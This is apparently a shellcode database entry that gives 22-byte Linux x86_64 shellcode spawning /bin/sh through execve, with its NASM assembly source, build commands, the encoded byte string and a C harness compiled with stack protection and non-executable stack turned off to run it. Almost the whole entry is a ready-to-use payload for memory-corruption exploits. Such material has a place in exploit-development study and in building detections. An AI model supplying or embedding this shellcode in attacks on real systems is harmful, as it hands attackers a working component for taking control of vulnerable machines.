Title: Linux/x86_64 - execve(/bin/sh) (22 bytes)
;Author: Aron Mihaljevic
;Architecture: Linux x86_64
;Shellcode Length:  22 bytes
;github = https://github.com/STARRBOY


============ASM===========================
global _start

section .text

_start:



	;int execve(const char *filename, char *const argv[],char *const envp[])
	xor 	rsi,	rsi			;clear rsi
	push	rsi				;push null on the stack
	mov 	rdi,	0x68732f2f6e69622f	 ;/bin//sh in reverse order
	push	rdi
	push	rsp
	pop	rdi				;stack pointer to /bin//sh
	mov 	al,	59			;sys_execve
	cdq					;sign extend of eax
	syscall

=======Generate Shellcode==========================================
nasm -felf64 spawn_shell.nasm -o spawn_shell.o
ld spawn_shell.o -o spawn_shell


=========generate C program to exploit=============================
gcc -fno-stack-protector -z execstack shell.c -o shell

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
                  "\x48\x31\xf6\x56\x48\xbf"
		  "\x2f\x62\x69\x6e\x2f"
		  "\x2f\x73\x68\x57\x54"
		  "\x5f\xb0\x3b\x99\x0f\x05";
int main(){

        printf("length of your shellcode is: %d\n", (int)strlen(code));

        int (*ret)() = (int(*)())code;

        ret();
}